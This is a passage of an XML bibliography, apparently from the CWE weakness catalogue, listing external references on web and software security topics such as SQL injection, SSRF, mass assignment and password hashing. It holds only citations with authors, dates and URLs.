			<ns0:URL>https://www.slideshare.net/RafalLos/defying-logic-business-logic-testing-with-automation</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-801">
			<ns0:Author>Viktoria Felmetsger</ns0:Author>
			<ns0:Author>Ludovico Cavedon</ns0:Author>
			<ns0:Author>Christopher Kruegel</ns0:Author>
			<ns0:Author>Giovanni Vigna</ns0:Author>
			<ns0:Title>Toward Automated Detection of Logic Vulnerabilities in Web Applications</ns0:Title>
			<ns0:Publication>USENIX Security Symposium 2010</ns0:Publication>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:URL>https://www.usenix.org/legacy/events/sec10/tech/full_papers/Felmetsger.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-802">
			<ns0:Author>Faisal Nabi</ns0:Author>
			<ns0:Title>Designing a Framework Method for Secure Business Application Logic Integrity in e-Commerce Systems</ns0:Title>
			<ns0:Publication>International Journal of Network Security, Vol.12, No.1</ns0:Publication>
			<ns0:Publication_Year>2011</ns0:Publication_Year>
			<ns0:URL>http://ijns.femto.com.tw/contents/ijns-v12-n1/ijns-2011-v12-n1-p29-41.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-806">
			<ns0:Author>WASC</ns0:Author>
			<ns0:Title>Insufficient Process Validation</ns0:Title>
			<ns0:URL>http://projects.webappsec.org/w/page/13246943/Insufficient-Process-Validation</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-811">
			<ns0:Author>Mark Dowd</ns0:Author>
			<ns0:Author>Ryan Smith</ns0:Author>
			<ns0:Author>David Dewey</ns0:Author>
			<ns0:Title>Attacking Interoperability</ns0:Title>
			<ns0:Publication_Year>2009</ns0:Publication_Year>
			<ns0:URL>http://hustlelabs.com/stuff/bh2009_dowd_smith_dewey.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-859">
			<ns0:Author>Steven Christey</ns0:Author>
			<ns0:Title>Argument injection issues</ns0:Title>
			<ns0:URL>https://seclists.org/bugtraq/2007/Feb/234ed</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-867">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>SQL Injection Prevention Cheat Sheet</ns0:Title>
			<ns0:URL>http://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-868">
			<ns0:Author>Steven Friedl</ns0:Author>
			<ns0:Title>SQL Injection Attacks by Example</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---10</ns0:Publication_Day>
			<ns0:URL>http://www.unixwiz.net/techtips/sql-injection.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-869">
			<ns0:Author>Ferruh Mavituna</ns0:Author>
			<ns0:Title>SQL Injection Cheat Sheet</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20080126180244/http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-870">
			<ns0:Author>David Litchfield</ns0:Author>
			<ns0:Author>Chris Anley</ns0:Author>
			<ns0:Author>John Heasman</ns0:Author>
			<ns0:Author>Bill Grindlay</ns0:Author>
			<ns0:Title>The Database Hacker's Handbook: Defending Database Servers</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---14</ns0:Publication_Day>
			<ns0:Publisher>Wiley</ns0:Publisher>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-871">
			<ns0:Author>David Litchfield</ns0:Author>
			<ns0:Title>The Oracle Hacker's Handbook: Hacking and Defending Oracle</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---30</ns0:Publication_Day>
			<ns0:Publisher>Wiley</ns0:Publisher>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-872">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>SQL Injection</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:URL>https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms161953(v=sql.105)?redirectedfrom=MSDN</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-873">
			<ns0:Author>Microsoft Security Vulnerability Research &amp; Defense</ns0:Author>
			<ns0:Title>SQL Injection Attack</ns0:Title>
			<ns0:URL>https://msrc.microsoft.com/blog/2008/05/sql-injection-attack/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-874">
			<ns0:Author>Michael Howard</ns0:Author>
			<ns0:Title>Giving SQL Injection the Respect it Deserves</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:URL>https://learn.microsoft.com/en-us/archive/blogs/michael_howard/giving-sql-injection-the-respect-it-deserves</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-875">
			<ns0:Author>Frank Kim</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 2 - SQL Injection</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---01</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://www.sans.org/blog/top-25-series-rank-2-sql-injection/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-879">
			<ns0:Author>SPI Dynamics</ns0:Author>
			<ns0:Title>Web Applications and LDAP Injection</ns0:Title>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-882">
			<ns0:Author>Amit Klein</ns0:Author>
			<ns0:Title>Blind XPath Injection</ns0:Title>
			<ns0:Publication_Year>2004</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---19</ns0:Publication_Day>
			<ns0:URL>https://dl.packetstormsecurity.net/papers/bypass/Blind_XPath_Injection_20040518.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-884">
			<ns0:Author>Mateusz "j00ru" Jurczyk</ns0:Author>
			<ns0:Title>Windows Kernel Reference Count Vulnerabilities - Case Study</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:URL>https://j00ru.vexillium.org/slides/2012/zeronights.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-885">
			<ns0:Author>Stefan Esser</ns0:Author>
			<ns0:Title>Shocking News in PHP Exploitation</ns0:Title>
			<ns0:Publication_Year>2009</ns0:Publication_Year>
			<ns0:URL>https://owasp.org/www-pdf-archive/POC2009-ShockingNewsInPHPExploitation.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-886">
			<ns0:Author>Dinis Cruz</ns0:Author>
			<ns0:Title>"Two Security Vulnerabilities in the Spring Framework's MVC" pdf (from 2008)</ns0:Title>
			<ns0:URL>http://diniscruz.blogspot.com/2011/07/two-security-vulnerabilities-in-spring.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-887">
			<ns0:Author>Ryan Berg</ns0:Author>
			<ns0:Author>Dinis Cruz</ns0:Author>
			<ns0:Title>Two Security Vulnerabilities in the Spring Framework's MVC</ns0:Title>
			<ns0:URL>https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-888">
			<ns0:Author>ASPNETUE</ns0:Author>
			<ns0:Title>Best Practices for ASP.NET MVC</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---17</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20100921074010/http://blogs.msdn.com/b/aspnetue/archive/2010/09/17/second_2d00_post.aspx</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-889">
			<ns0:Author>Michael Hartl</ns0:Author>
			<ns0:Title>Mass assignment in Rails applications</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---21</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20090808163156/http://blog.mhartl.com/2008/09/21/mass-assignment-in-rails-applications/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-890">
			<ns0:Author>Tobi</ns0:Author>
			<ns0:Title>Secure your Rails apps!</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---06</ns0:Publication_Day>
			<ns0:URL>https://pragtob.wordpress.com/2012/03/06/secure-your-rails-apps/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-891">
			<ns0:Author>Heiko Webers</ns0:Author>
			<ns0:Title>Ruby On Rails Security Guide</ns0:Title>
			<ns0:URL>https://guides.rubyonrails.org/security.html#mass-assignment</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-892">
			<ns0:Author>Josh Bush</ns0:Author>
			<ns0:Title>Mass Assignment Vulnerability in ASP.NET MVC</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20120309022539/http://freshbrewedcode.com/joshbush/2012/03/05/mass-assignment-aspnet-mvc</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-893">
			<ns0:Author>K. Scott Allen</ns0:Author>
			<ns0:Title>6 Ways To Avoid Mass Assignment in ASP.NET MVC</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---12</ns0:Publication_Day>
			<ns0:URL>https://odetocode.com/blogs/scott/archive/2012/03/11/complete-guide-to-mass-assignment-in-asp-net-mvc.aspx</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-894">
			<ns0:Author>Egidio Romano</ns0:Author>
			<ns0:Title>PHP Object Injection</ns0:Title>
			<ns0:Publication_Year>2013</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---22</ns0:Publication_Day>
			<ns0:URL>https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-908">
			<ns0:Author>Solar Designer</ns0:Author>
			<ns0:Title>Password hashing at scale</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---01</ns0:Publication_Day>
			<ns0:URL>https://www.openwall.com/presentations/YaC2012-Password-Hashing-At-Scale/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-909">
			<ns0:Author>Solar Designer</ns0:Author>
			<ns0:Title>New developments in password hashing: ROM-port-hard functions</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:URL>https://www.openwall.com/presentations/ZeroNights2012-New-In-Password-Hashing/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-911">
			<ns0:Author>Stefano Di Paola</ns0:Author>
			<ns0:Author>Arshan Dabirsiaghi</ns0:Author>
			<ns0:Title>Expression Language Injection</ns0:Title>
			<ns0:Publication_Year>2011</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---12</ns0:Publication_Day>
			<ns0:URL>https://mindedsecurity.com/wp-content/uploads/2020/10/ExpressionLanguageInjection.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-912">
			<ns0:Author>Dan Amodio</ns0:Author>
			<ns0:Title>Remote Code with Expression Language Injection</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---14</ns0:Publication_Day>
			<ns0:URL>http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-913">
			<ns0:Author>Alexander Polyakov</ns0:Author>
			<ns0:Author>Dmitry Chastukhin</ns0:Author>
			<ns0:Title>SSRF vs. Business-critical applications: XXE tunneling in SAP</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---26</ns0:Publication_Day>
			<ns0:URL>https://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-914">
			<ns0:Author>Alexander Polyakov</ns0:Author>
			<ns0:Author>Dmitry Chastukhin</ns0:Author>
			<ns0:Author>Alexey Tyurin</ns0:Author>
			<ns0:Title>SSRF vs. Business-critical Applications. Part 1: XXE Tunnelling in SAP NetWeaver</ns0:Title>
			<ns0:URL>http://erpscan.com/wp-content/uploads/2012/08/SSRF-vs-Businness-critical-applications-whitepaper.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-915">
			<ns0:Author>Riyaz Ahemed Walikar</ns0:Author>
			<ns0:Title>Cross Site Port Attacks - XSPA - Part 1</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---07</ns0:Publication_Day>
			<ns0:URL>https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-1/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-916">
			<ns0:Author>Riyaz Ahemed Walikar</ns0:Author>
			<ns0:Title>Cross Site Port Attacks - XSPA - Part 2</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---13</ns0:Publication_Day>
			<ns0:URL>https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-2/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-917">
			<ns0:Author>Riyaz Ahemed Walikar</ns0:Author>
			<ns0:Title>Cross Site Port Attacks - XSPA - Part 3</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---14</ns0:Publication_Day>
			<ns0:URL>https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-3/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-918">
			<ns0:Author>Vladimir Vorontsov</ns0:Author>
			<ns0:Author>Alexander Golovko</ns0:Author>
			<ns0:Title>SSRF attacks and sockets: smorgasbord of vulnerabilities</ns0:Title>
			<ns0:URL>https://www.slideshare.net/DefconRussia/vorontsov-golovko-ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-919">
			<ns0:Author>ONsec Lab</ns0:Author>
			<ns0:Title>SSRF bible. Cheatsheet</ns0:Title>
			<ns0:Publication_Year>2013</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---26</ns0:Publication_Day>
			<ns0:URL>https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit?pli=1#</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-920">
			<ns0:Author>Deral Heiland</ns0:Author>
			<ns0:Title>Web Portals: Gateway To Information, Or A Hole In Our Perimeter Defenses</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:URL>http://www.shmoocon.org/2008/presentations/Web%20portals,%20gateway%20to%20information.ppt</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-921">
			<ns0:Author>Android Open Source Project</ns0:Author>
			<ns0:Title>Security Tips</ns0:Title>
			<ns0:Publication_Year>2013</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---16</ns0:Publication_Day>
			<ns0:URL>https://developer.android.com/training/articles/security-tips.html#StoringData</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-922">
			<ns0:Author>Erika Chin</ns0:Author>
			<ns0:Author>Adrienne Porter Felt</ns0:Author>
			<ns0:Author>Kate Greenwood</ns0:Author>
			<ns0:Author>David Wagner</ns0:Author>
			<ns0:Title>Analyzing Inter-Application Communication in Android</ns0:Title>
			<ns0:URL>http://www.eecs.berkeley.edu/~daw/papers/intents-mobisys11.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-923">
			<ns0:Author>Android Open Source Project</ns0:Author>
			<ns0:Title>Security Tips</ns0:Title>
			<ns0:Publication_Year>2013</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---16</ns0:Publication_Day>
			<ns0:URL>https://developer.android.com/training/articles/security-tips#ContentProviders</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-928">
			<ns0:Author>Ulf Harnhammar</ns0:Author>
			<ns0:Title>CRLF Injection</ns0:Title>
			<ns0:Publication>Bugtraq</ns0:Publication>
			<ns0:Publication_Year>2002</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---07</ns0:Publication_Day>
			<ns0:URL>http://marc.info/?l=bugtraq&amp;m=102088154213630&amp;w=2</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-938">
			<ns0:Author>Guillaume Ross</ns0:Author>
			<ns0:Title>Scheming for Privacy and Security</ns0:Title>
			<ns0:Publication_Year>2013</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:URL>https://brooksreview.net/2013/11/guest-post_scheming-for-privacy-and-security/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-941">
			<ns0:Author>US-CERT</ns0:Author>
			<ns0:Title>UDP-based Amplification Attacks</ns0:Title>
			<ns0:Publication_Year>2014</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---17</ns0:Publication_Day>
			<ns0:URL>https://www.us-cert.gov/ncas/alerts/TA14-017A</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-942">
			<ns0:Author>Fortify</ns0:Author>
			<ns0:Title>Android Bad Practices: Sticky Broadcast</ns0:Title>
			<ns0:URL>https://www.hpe.com/us/en/solutions/infrastructure-security.html?jumpid=va_wnmstr1ug6_aid-510326901</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-943">
			<ns0:Author>Apurva Udaykumar</ns0:Author>
			<ns0:Title>Setting a crossdomain.xml file for HTTP streaming</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---19</ns0:Publication_Day>
			<ns0:Publisher>Adobe</ns0:Publisher>
			<ns0:URL>https://web.archive.org/web/20121124184922/http://www.adobe.com/devnet/adobe-media-server/articles/cross-domain-xml-for-streaming.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-944">
			<ns0:Author>Adobe</ns0:Author>
			<ns0:Title>Cross-domain policy for Flash movies</ns0:Title>
			<ns0:Publisher>Adobe</ns0:Publisher>
			<ns0:URL>http://kb2.adobe.com/cps/142/tn_14213.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-945">
			<ns0:Author>Microsoft Corporation</ns0:Author>
			<ns0:Title>HTTP Communication and Security with Silverlight</ns0:Title>
			<ns0:URL>https://learn.microsoft.com/en-us/previous-versions/windows/silverlight/dotnet-windows-silverlight/cc838250(v=vs.95)?redirectedfrom=MSDN</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-946">
			<ns0:Author>Microsoft Corporation</ns0:Author>
			<ns0:Title>Network Security Access Restrictions in Silverlight</ns0:Title>
			<ns0:URL>https://learn.microsoft.com/en-us/previous-versions/windows/silverlight/dotnet-windows-silverlight/cc645032(v=vs.95)</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-947">
			<ns0:Author>Dongseok Jang</ns0:Author>
			<ns0:Author>Aishwarya Venkataraman</ns0:Author>
			<ns0:Author>G. Michael Sawka</ns0:Author>
			<ns0:Author>Hovav Shacham</ns0:Author>
			<ns0:Title>Analyzing the Crossdomain Policies of Flash Applications</ns0:Title>
			<ns0:Publication_Year>2011</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:URL>http://cseweb.ucsd.edu/~hovav/dist/crossdomain.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-951">
			<ns0:Author>Shaun Clowes</ns0:Author>
			<ns0:Title>A Study in Scarlet</ns0:Title>
			<ns0:URL>https://www.cgisecurity.com/lib/studyinscarlet.txt</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-952">
			<ns0:Author>Stefan Esser</ns0:Author>
			<ns0:Title>Suhosin</ns0:Title>
			<ns0:URL>http://www.hardened-php.net/suhosin/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-953">
			<ns0:Author>Johannes Ullrich</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 13 - PHP File Inclusion</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://www.sans.org/blog/top-25-series-rank-13-php-file-inclusion/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-954">
			<ns0:Author>Mozilla MDN</ns0:Author>
			<ns0:Title>Equality comparisons and sameness</ns0:Title>
			<ns0:URL>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness</ns0:URL>
			<ns0:URL_Date>2017-11-17</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-955">
			<ns0:Author>Chris McMahon Stone</ns0:Author>
			<ns0:Author>Tom Chothia</ns0:Author>
			<ns0:Author>Flavio D. Garcia</ns0:Author>
			<ns0:Title>Spinner: Semi-Automatic Detection of Pinning without Hostname Verification</ns0:Title>
			<ns0:URL>http://www.cs.bham.ac.uk/~garciaf/publications/spinner.pdf</ns0:URL>
			<ns0:URL_Date>2018-01-16</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-956">
			<ns0:Author>Wikipedia</ns0:Author>
			<ns0:Title>Samy (computer worm)</ns0:Title>
			<ns0:URL>https://en.wikipedia.org/wiki/Samy_(computer_worm)</ns0:URL>
			<ns0:URL_Date>2018-01-16</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-958">
			<ns0:Author>Mathias Bynens</ns0:Author>
			<ns0:Title>About rel=noopener</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:URL>https://mathiasbynens.github.io/rel-noopener/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-959">
			<ns0:Author>Object Management Group (OMG)</ns0:Author>
			<ns0:Title>Automated Source Code Performance Efficiency Measure (ASCPEM)</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:URL>https://www.omg.org/spec/ASCPEM/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-960">
			<ns0:Author>Object Management Group (OMG)</ns0:Author>
			<ns0:Title>Automated Source Code Maintainability Measure (ASCMM)</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:URL>https://www.omg.org/spec/ASCMM/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-961">
			<ns0:Author>Object Management Group (OMG)</ns0:Author>
			<ns0:Title>Automated Source Code Reliability Measure (ASCRM)</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:URL>http://www.omg.org/spec/ASCRM/1.0/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-962">
			<ns0:Author>Object Management Group (OMG)</ns0:Author>
			<ns0:Title>Automated Source Code Security Measure (ASCSM)</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:URL>http://www.omg.org/spec/ASCSM/1.0/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-963">
			<ns0:Author>Robert A. Martin</ns0:Author>
			<ns0:Author>Lawrence H. Shafer</ns0:Author>
			<ns0:Title>Providing a Framework for Effective Software Quality Assessment</ns0:Title>
			<ns0:Publication_Year>1996</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:URL>https://www.researchgate.net/publication/285403022_PROVIDING_A_FRAMEWORK_FOR_EFFECTIVE_SOFTWARE_QUALITY_MEASUREMENT_MAKING_A_SCIENCE_OF_RISK_ASSESSMENT</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-964">
			<ns0:Author>Wikipedia</ns0:Author>
			<ns0:Title>Cyclomatic Complexity</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
